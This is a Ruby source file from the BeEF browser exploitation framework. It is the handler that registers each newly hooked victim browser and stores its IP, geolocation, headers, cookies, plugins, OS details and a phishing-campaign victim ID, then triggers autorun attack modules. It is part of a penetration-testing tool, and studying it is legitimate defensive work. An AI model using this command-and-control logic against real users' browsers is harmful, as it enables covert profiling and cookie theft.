#
# Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
  module Core
    module Handlers
      # @note Retrieves information about the browser (type, version, plugins etc.)
      class BrowserDetails

        @data = {}

        HB = BeEF::Core::Models::HookedBrowser
        BD = BeEF::Core::Models::BrowserDetails

        def initialize(data)
          @data = data
          setup()
        end

        def err_msg(error)
          print_error "[Browser Details] #{error}"
        end

        def setup()
          print_debug "[INIT] Processing Browser Details..."
          config = BeEF::Core::Configuration.instance

          # validate hook session value
          session_id = get_param(@data, 'beefhook')
          (self.err_msg "session id is invalid"; return) if not BeEF::Filters.is_valid_hook_session_id?(session_id)
          hooked_browser = HB.first(:session => session_id)
          return if not hooked_browser.nil? # browser is already registered with framework

          # create the structure representing the hooked browser
          zombie = BeEF::Core::Models::HookedBrowser.new(:ip => @data['request'].ip, :session => session_id)
          zombie.firstseen = Time.new.to_i

          # hostname
          log_zombie_port = 0
          if not @data['results']['HostName'].nil? then
            log_zombie_domain=@data['results']['HostName']
          elsif (not @data['request'].referer.nil?) and (not @data['request'].referer.empty?)
            referer = @data['request'].referer
            if referer.start_with?("https://") then
              log_zombie_port = 443
            else
              log_zombie_port = 80
            end
            log_zombie_domain=referer.gsub('http://', '').gsub('https://', '').split('/')[0]
          else
            log_zombie_domain="unknown" # Probably local file open
          end

          # port
          if not @data['results']['HostPort'].nil? then
            log_zombie_port=@data['results']['HostPort']
          else
            log_zombie_domain_parts=log_zombie_domain.split(':')
            if log_zombie_domain_parts.length > 1 then
              log_zombie_port=log_zombie_domain_parts[1].to_i
            end
          end

          zombie.domain = log_zombie_domain
          zombie.port = log_zombie_port

          #Parse http_headers. Unfortunately Rack doesn't provide a util-method to get them :(
          @http_headers = Hash.new
          http_header = @data['request'].env.select { |k, v| k.to_s.start_with? 'HTTP_' }
          .each { |key, value|
            @http_headers[key.sub(/^HTTP_/, '')] = value.force_encoding('UTF-8')
          }
          zombie.httpheaders = @http_headers.to_json
          zombie.save
          #print_debug "[INIT] HTTP Headers: #{zombie.httpheaders}"

          # add a log entry for the newly hooked browser
          BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} just joined the horde from the domain: #{log_zombie_domain}:#{log_zombie_port.to_s}", "#{zombie.id}")
          # get and store browser name
          browser_name = get_param(@data['results'], 'BrowserName')
          if BeEF::Filters.is_valid_browsername?(browser_name)
            BD.set(session_id, 'BrowserName', browser_name)
          else
            self.err_msg "Invalid browser name returned from the hook browser's initial connection."
          end

          # lookup zombie host name
          ip_str = zombie.ip
          if config.get('beef.dns_hostname_lookup')
            begin
              host_name = Resolv.getname(zombie.ip).to_s
              if BeEF::Filters.is_valid_hostname?(host_name)
                ip_str += " [#{host_name}]"
              end
            rescue
              print_debug "[INIT] Reverse lookup failed - No results for IP address '#{zombie.ip}'"
            end
          end
          BD.set(session_id, 'IP', ip_str)

          # geolocation
          if config.get('beef.geoip.enable')
            require 'geoip'
            geoip_file = config.get('beef.geoip.database')
            if File.exists? geoip_file
              geoip = GeoIP.new(geoip_file).city(zombie.ip)
              if geoip.nil?
                print_debug "[INIT] Geolocation failed - No results for IP address '#{zombie.ip}'"
              else
                #print_debug "[INIT] Geolocation results: #{geoip}"
                BeEF::Core::Logger.instance.register('Zombie', "#{zombie.ip} is connecting from: #{geoip}", "#{zombie.id}")
                BD.set(session_id, 'LocationCity', "#{geoip['city_name']}")
                BD.set(session_id, 'LocationCountry', "#{geoip['country_name']}")
                BD.set(session_id, 'LocationCountryCode2', "#{geoip['country_code2']}")
                BD.set(session_id, 'LocationCountryCode3', "#{geoip['country_code3']}")
                BD.set(session_id, 'LocationContinentCode', "#{geoip['continent_code']}")
                BD.set(session_id, 'LocationPostCode', "#{geoip['postal_code']}")
                BD.set(session_id, 'LocationLatitude', "#{geoip['latitude']}")
                BD.set(session_id, 'LocationLongitude', "#{geoip['longitude']}")
                BD.set(session_id, 'LocationDMACode', "#{geoip['dma_code']}")
                BD.set(session_id, 'LocationAreaCode', "#{geoip['area_code']}")
                BD.set(session_id, 'LocationTimezone', "#{geoip['timezone']}")
                BD.set(session_id, 'LocationRegionName', "#{geoip['real_region_name']}")
              end
            else
              print_error "[INIT] Geolocation failed - Could not find MaxMind GeoIP database '#{geoip_file}'"
              print_more "Download: http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz"
            end
          end

          # detect browser proxy
          using_proxy = false
          [
              'CLIENT_IP',
              'FORWARDED_FOR',
              'FORWARDED',
              'FORWARDED_FOR_IP',
              'PROXY_CONNECTION',
              'PROXY_AUTHENTICATE',
              'X_FORWARDED',
              'X_FORWARDED_FOR',
              'VIA'
          ].each do |header|
            unless JSON.parse(zombie.httpheaders)[header].nil?
              using_proxy = true
              break
            end
          end

          # retrieve proxy client IP
          proxy_clients = []
          [
              'CLIENT_IP',
              'FORWARDED_FOR',
              'FORWARDED',
              'FORWARDED_FOR_IP',
              'X_FORWARDED',
              'X_FORWARDED_FOR'
          ].each do |header|
            proxy_clients << "#{JSON.parse(zombie.httpheaders)[header]}" unless JSON.parse(zombie.httpheaders)[header].nil?
          end

          # retrieve proxy server
          proxy_server = JSON.parse(zombie.httpheaders)['VIA'] unless JSON.parse(zombie.httpheaders)['VIA'].nil?

          # store and log proxy details
          if using_proxy == true
            BD.set(session_id, 'UsingProxy', "#{using_proxy}")
            proxy_log_string = "#{zombie.ip} is using a proxy"
            unless proxy_clients.empty?
              BD.set(session_id, 'ProxyClient', "#{proxy_clients.sort.uniq.join(',')}")
              proxy_log_string += " [client: #{proxy_clients.sort.uniq.join(',')}]"
            end
            unless proxy_server.nil?
              BD.set(session_id, 'ProxyServer', "#{proxy_server}")
              proxy_log_string += " [server: #{proxy_server}]"
              if config.get("beef.extension.network.enable") == true
                if proxy_server =~ /^([\d\.]+):([\d]+)$/
                  print_debug("Hooked browser [id:#{zombie.id}] is using a proxy [ip: #{$1}]")
                  BeEF::Core::Models::NetworkHost.add(:hooked_browser_id => session_id, :ip => $1, :type => 'Proxy')
                end
              end
            end
            BeEF::Core::Logger.instance.register('Zombie', "#{proxy_log_string}", "#{zombie.id}")
          end

          # get and store browser version
          browser_version = get_param(@data['results'], 'BrowserVersion')
          if BeEF::Filters.is_valid_browserversion?(browser_version)
            BD.set(session_id, 'BrowserVersion', browser_version)
          else
            self.err_msg "Invalid browser version returned from the hook browser's initial connection."
          end

          # get and store browser string
          browser_string = get_param(@data['results'], 'BrowserReportedName')
          if BeEF::Filters.is_valid_browserstring?(browser_string)
            BD.set(session_id, 'BrowserReportedName', browser_string)
          else
            self.err_msg "Invalid browser string returned from the hook browser's initial connection."
          end

          # get and store browser language
          browser_lang = get_param(@data['results'], 'BrowserLanguage')
          BD.set(session_id, 'BrowserLanguage', browser_lang)

          # get and store the cookies
          cookies = get_param(@data['results'], 'Cookies')
          if BeEF::Filters.is_valid_cookies?(cookies)
            BD.set(session_id, 'Cookies', cookies)
          else
            self.err_msg "Invalid cookies returned from the hook browser's initial connection."
          end

          # get and store the OS name
          os_name = get_param(@data['results'], 'OsName')
          if BeEF::Filters.is_valid_osname?(os_name)
            BD.set(session_id, 'OsName', os_name)
          else
            self.err_msg "Invalid operating system name returned from the hook browser's initial connection."
          end

          # get and store the OS version (without checks as it can be very different or even empty, for instance on linux/bsd)
          os_version = get_param(@data['results'], 'OsVersion')
          BD.set(session_id, 'OsVersion', os_version)

          # get and store default browser
          default_browser = get_param(@data['results'], 'DefaultBrowser')
          BD.set(session_id, 'DefaultBrowser', default_browser)

          # get and store the hardware name
          hw_name = get_param(@data['results'], 'Hardware')
          if BeEF::Filters.is_valid_hwname?(hw_name)
            BD.set(session_id, 'Hardware', hw_name)
          else
            self.err_msg "Invalid hardware name returned from the hook browser's initial connection."
          end

          # get and store the date
          date_stamp = get_param(@data['results'], 'DateStamp')
          if BeEF::Filters.is_valid_date_stamp?(date_stamp)
            BD.set(session_id, 'DateStamp', date_stamp)
          else
            self.err_msg "Invalid date returned from the hook browser's initial connection."
          end

          # get and store page title
          page_title = get_param(@data['results'], 'PageTitle')
          if BeEF::Filters.is_valid_pagetitle?(page_title)
            BD.set(session_id, 'PageTitle', page_title)
          else
            self.err_msg "Invalid page title returned from the hook browser's initial connection."
          end

          # get and store page uri
          page_uri = get_param(@data['results'], 'PageURI')
          if BeEF::Filters.is_valid_url?(page_uri)
            BD.set(session_id, 'PageURI', page_uri)
          else
            self.err_msg "Invalid page URL returned from the hook browser's initial connection."
          end

          # get and store the page referrer
          page_referrer = get_param(@data['results'], 'PageReferrer')
          if BeEF::Filters.is_valid_pagereferrer?(page_referrer)
            BD.set(session_id, 'PageReferrer', page_referrer)
          else
            self.err_msg "Invalid page referrer returned from the hook browser's initial connection."
          end

          # get and store hostname
          host_name = get_param(@data['results'], 'HostName')
          if BeEF::Filters.is_valid_hostname?(host_name)
            BD.set(session_id, 'HostName', host_name)
          else
            self.err_msg "Invalid host name returned from the hook browser's initial connection."
          end

          # get and store the browser plugins
          browser_plugins = get_param(@data['results'], 'BrowserPlugins')
          if BeEF::Filters.is_valid_browser_plugins?(browser_plugins)
            BD.set(session_id, 'BrowserPlugins', browser_plugins)
          else
            self.err_msg "Invalid browser plugins returned from the hook browser's initial connection."
          end

          # get and store the system platform
          system_platform = get_param(@data['results'], 'BrowserPlatform')
          if BeEF::Filters.is_valid_system_platform?(system_platform)
            BD.set(session_id, 'BrowserPlatform', system_platform)
          else
            self.err_msg "Invalid browser platform returned from the hook browser's initial connection."
          end

          # get and store the hooked browser type
          browser_type = get_param(@data['results'], 'BrowserType')
          if BeEF::Filters.is_valid_browsertype?(browser_type)
            BD.set(session_id, 'BrowserType', browser_type)
          else
            self.err_msg "Invalid hooked browser type returned from the hook browser's initial connection."
          end

          # get and store the zombie screen size and color depth
          screen_size = get_param(@data['results'], 'ScreenSize')
          if BeEF::Filters.is_valid_screen_size?(screen_size)
            BD.set(session_id, 'ScreenSize', screen_size)
          else
            self.err_msg "Invalid screen size returned from the hook browser's initial connection."
          end

          # get and store the window size
          window_size = get_param(@data['results'], 'WindowSize')
          if BeEF::Filters.is_valid_window_size?(window_size)
            BD.set(session_id, 'WindowSize', window_size)
          else
            self.err_msg "Invalid window size returned from the hook browser's initial connection."
          end

          # get and store the yes|no value for browser components
          components = [
              'VBScriptEnabled', 'HasFlash', 'HasPhonegap', 'HasGoogleGears',
              'HasWebSocket', 'HasWebWorker', 'HasWebGL', 'HasWebRTC', 'HasActiveX',
              'HasQuickTime', 'HasRealPlayer', 'HasWMP'
          ]
          components.each do |k|
            v = get_param(@data['results'], k)
            if BeEF::Filters.is_valid_yes_no?(v)
              BD.set(session_id, k, v)
            else
              self.err_msg "Invalid value for #{k} returned from the hook browser's initial connection."
            end
          end

          # get and store the value for CPU
          cpu_type = get_param(@data['results'], 'CPU')
          if BeEF::Filters.is_valid_cpu?(cpu_type)
            BD.set(session_id, 'CPU', cpu_type)
          else
            self.err_msg "Invalid value for CPU returned from the hook browser's initial connection."
          end

          # get and store the value for TouchEnabled
          touch_enabled = get_param(@data['results'], 'TouchEnabled')
          if BeEF::Filters.is_valid_yes_no?(touch_enabled)
            BD.set(session_id, 'TouchEnabled', touch_enabled)
          else
            self.err_msg "Invalid value for TouchEnabled returned from the hook browser's initial connection."
          end

          if config.get('beef.integration.phishing_frenzy.enable')
            # get and store the browser plugins
            victim_uid = get_param(@data['results'], 'PhishingFrenzyUID')
            print_debug "PhishingFrenzy victim UID is #{victim_uid}"
            if BeEF::Filters.alphanums_only?(victim_uid)
              BD.set(session_id, 'PhishingFrenzyUID', victim_uid)
            else
              self.err_msg "Invalid PhishingFrenzy Victim UID returned from the hook browser's initial connection."
            end
          end

          # log a few info of newly hooked zombie in the console
          print_info "New Hooked Browser [id:#{zombie.id}, ip:#{zombie.ip}, browser:#{browser_name}-#{browser_version}, os:#{os_name}-#{os_version}], hooked domain [#{log_zombie_domain}:#{log_zombie_port.to_s}]"

          # add localhost as network host
          if config.get('beef.extension.network.enable')
            print_debug("Hooked browser has network interface 127.0.0.1")
            BeEF::Core::Models::NetworkHost.add(:hooked_browser_id => session_id, :ip => '127.0.0.1', :hostname => 'localhost', :os => BeEF::Core::Models::BrowserDetails.get(session_id, 'OsName'))
          end

          # check if any ARE rules shall be triggered only if the channel is != WebSockets (XHR). If the channel
          # is WebSockets, then ARe rules are triggered after channel is established.
          unless config.get("beef.http.websocket.enable")
            BeEF::Core::AutorunEngine::Engine.instance.run(zombie.id, browser_name, browser_version, os_name, os_version)
          end
        end

        def get_param(query, key)
          (query.class == Hash and query.has_key?(key)) ? query[key].to_s : nil
        end
      end


    end
  end
end


